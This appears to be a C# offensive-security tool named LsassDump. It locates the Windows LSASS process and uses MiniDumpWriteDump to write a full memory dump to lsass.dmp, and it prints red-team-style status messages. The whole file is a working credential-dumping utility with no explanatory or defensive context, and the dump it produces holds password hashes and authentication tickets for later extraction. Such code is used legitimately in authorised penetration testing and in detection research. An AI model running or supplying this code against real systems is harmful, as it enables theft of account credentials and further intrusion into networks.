using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace LsassDump
{
    class Program
    {

		[StructLayout(LayoutKind.Sequential, Pack = 4)]
		public struct MINIDUMP_EXCEPTION_INFORMATION
		{
			public uint ThreadId;
			public IntPtr ExceptionPointers;
			public int ClientPointers;
		}

		[DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
		static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

		static void Main(string[] args)
		{
            // Find lsass PID	
            IntPtr targetProcessHandle = IntPtr.Zero;
            Process[] processes = Process.GetProcessesByName("lsass");
            Process targetProcess = processes[0];
			uint targetProcessId = (uint)targetProcess.Id;
			Console.WriteLine("[*] Found LSASS PID: " + targetProcessId);

			// Open handle to lsass.exe process
			targetProcessHandle = targetProcess.Handle;

			// Dump to file
			var outFile = "./lsass.dmp";
			using (FileStream fs = new FileStream(outFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
			{
				MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
				Console.WriteLine("[+] Saved LSASS dump.");
			}
		}
    }
}
